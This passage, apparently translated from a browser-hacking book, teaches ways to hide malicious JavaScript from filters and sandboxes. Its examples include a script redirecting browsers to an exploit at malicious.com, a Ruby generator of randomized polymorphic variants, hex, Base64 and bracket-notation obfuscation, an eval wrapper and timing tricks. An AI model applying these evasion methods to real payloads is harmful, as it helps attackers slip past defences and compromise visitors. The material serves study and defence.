
如你所见，像`alert(1)`这样短函数的字符编码所需字符数量很大。这使得这种编码技术很有趣，但如果需要编码数百行JavaScript代码，则并不总是有效。无论其适用性如何，拥有另一种编码技术来隐藏小段代码是有用的。

Yosuke最初的JJencode理念引起了安全行业的兴趣，进而推动了该领域的进一步实验，最终在slackers.org上由Robert Hansen创建了Diminutive NoAlNum JS Contest23。

### 利用混淆规避

前面的章节展示了编码的工作原理，以及它在隐藏JavaScript代码时的作用。混淆是另一种隐藏代码的方法，当与编码结合使用时，可以成为绕过网络过滤的非常有效手段。这些技术在野外非常常见；例如，客户端攻击交付工具包（如BlackHole24）通常会使用混淆和编码的JavaScript负载。下面的章节将探讨多种技术，帮助你让代码更难被检测。

#### 随机变量和方法

如果你是开发者，你会知道编写清晰且易维护的代码是首要任务。下面的代码之所以易读，是因为变量和方法名称具有自解释性。一个新对象`malware`被创建，包含多个属性。随后，`malware`对象被挂载到`window`对象上，并调用`redirect_to_site()`函数，该函数会将浏览器重定向到`exploits`数组中的第一个URL。

```
var malware = {
    version: '0.0.1-alpha',
    exploits: new Array("http://malicious.com/aa.js",""),
    persistent: true
};
window.malware = malware; 

function redirect_to_site(){
    window.location = window.malware.exploits[0]; 
};

redirect_to_site();
```

现在想象一下，如果有一个网络过滤方案通过正则表达式过滤网络流量，搜索关键词`malware`、`version`号以及`redirect_to_malware()`或其他函数名称。这比你想象的更为常见，如果服务器端代码多样化（polymorphism）未被使用，它可能非常有效。

start feature 

* * *

**Server-side Polymorphism** 主要被恶意软件利用，该技术通过修改代码使其难以通过静态签名（static signatures）判定为恶意。代码在每个钩子（hook）中都会发生变化，这意味着如果同一恶意软件感染两台机器，其代码在比较时会呈现不同，但功能相同。

* * *

end feature 

实现基本的服务器端代码多样化并不困难。下面的简单演示使用了按钮（hooked browser）的Hash数据结构（如果需要实现按会话多样化，可扩展为按会话存储）。下面的Ruby代码是一个示例：

```
code = <<EOF
var malware = {
    version: '0.0.1-alpha',
    exploits: new Array("http://malicious.com/aa.js",""),
    persistent: true
};
window.malware = malware;
function redirect_to_site(){
    window.location = window.malware.exploits[0];
};
redirect_to_site();
EOF

def rnd(length=5)
    chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ_'
    result = ''
    length.times { result << chars[rand(chars.size)] }
    result
end

lookup = {
 "malware" => rnd(7),
 "exploits" => rnd(),
 "version" => rnd(),
 "persistent" => rnd(12),
 "0.0.1-alpha" => rnd(10),
 "redirect_to_site" => rnd(4)
}

lookup.each do |key,value|
 code = code.gsub!(key, value)
end

File.open("result.js", 'w'){|f|f.write(code)}
```

每次运行该代码（例如在钩取新浏览器时），result.js中的JavaScript代码将会不同。例如：

```
var uxGfLVC = {
    sXCrv: 'ZEpXkhxSMz',
    egCSx: new Array("http://malicious.com/aa.js",""),
    LctUZLQnJ_gp: true
};
window.uxGfLVC = uxGfLVC;
function HrhB(){
    window.location = window.uxGfLVC.egCSx[0];
};
HrhB();
```

随机变量和函数名未考虑作用域。如果考虑作用域，生成的代码会更难人为分析。假设之前的代码中还包含一个名为`execute()`的函数，且`redirect_to_site()`接受输入参数：

```
function execute(cmd){
eval(cmd);
};
function redirect_to_site(input){
if(input)
  window.location = window.malware.exploits[0];
};
redirect_to_site(input);
```

考虑作用域的混淆会使示例代码如下。由于人为可能错误地认为多个函数使用相同的全局变量，因此可读性降低：

```
function gSYYtNBjNFbZ(napSj){
eval(napSj); 
};

function HrhB(napSj){
if(napSj)
  window.location = window.uxGfLVC.egCSx[0]; 
};

HrhB(napSj);
```

#### 混合对象表示法

你可能习惯于使用点（Dot）表示法访问属性，而不是方括号（Bracket）表示法，尤其是在阅读大量JavaScript代码时。从语言角度看，这两种写法在功能上基本等价。

之前的代码示例使用了点（Dot）表示法。例如，当它调用`window`对象时，再访问`malware`对象，最后访问`malware`对象的一个属性：

```
window.malware.exploits[0];
```

同样，使用方括号（Bracket）表示法的等价代码如下：

```
window['malware']['exploits'][0];
```

混合这两种表示法同样可以写出完全合法的代码：

```
window.malware['exploits'][0];
```

结合前面提到的技术（包括Base64编码），可以创建如下示例：

```
var uxGfLVC = {
  sXCrv: 'ZEpXkhxSMz',
  egCSx: new Array("\x68\x74\x74\x70\x3A\x2F\x2F"+
           "\x6D\x61\x6C\x69\x63\x69\x6F"+
           atob("dXMuY35f34fgdkFhLmpz"['replace'](
           /35f34fgdk/,'29tL2')),""),
  LctUZLQnJ_gp: true
};

window['uxGfLVC'] = uxGfLVC; 
function HrhB(){
  window['lo'+'ca'+'ution'['replace'](
    /ution/,'tion')] = window.uxGfLVC['egC'+
    'Sx'][0]; 
};
HrhB();
```

可以明显（或不明显）地看出，使用点与方括号混合的写法使代码变得更难阅读。

数组通常通过`array[index]`或`array['string_element']`来访问。结合前面提到的对象访问方式和非意义化的变量名，这些方括号看起来像是用于从数据结构中获取元素，但实际并非如此，它们的作用正是制造混淆。这种混淆不仅针对人工分析人员，也可能针对网络过滤方案。

#### 时间延迟

基于时间的检查是恶意软件用来规避沙箱（emulation）的另一种方法。恶意软件检测技术通常会沙箱JavaScript引擎，特别是WAF或代理中可能存在的引擎。遗憾的是，这些引擎往往忽略`setTimeout()`或`setInterval()`的延迟，原因是性能考量。因此，一个检查JavaScript恶意载荷的内联网络代理不太可能等待30秒，这对用户不利。

这种行为可以通过实现主动延迟逻辑来利用，例如使用`setTimeout()`。延迟调用的函数也可以通过检查`Date()`对象来验证延迟是否按预期执行。如果未按时执行，触发真实恶意代码的解密例程可能不会被触发。这些技术对自动化分析恶意JavaScript很有效，但不一定能规避人工检测。
